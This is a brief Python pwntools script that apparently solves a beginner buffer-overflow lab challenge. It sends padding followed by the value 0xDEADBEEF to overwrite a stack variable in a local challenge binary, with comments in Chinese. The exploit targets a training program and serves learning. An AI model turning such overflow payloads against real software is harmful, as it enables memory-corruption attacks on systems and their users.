#!/usr/bin/python3

import pwn

ans = 0x0DEADBEEF

proc = pwn.process("/challenge/buffer-overflow-level1.0")
payload = b'a' * 0x10   # 写满缓冲区
payload += b'b' * 0x8
payload += pwn.p64(ans)   # 覆盖变量
print(payload)
proc.sendline(payload)

result = proc.recvall().decode()
for line in result.split('\n'):
    print(line)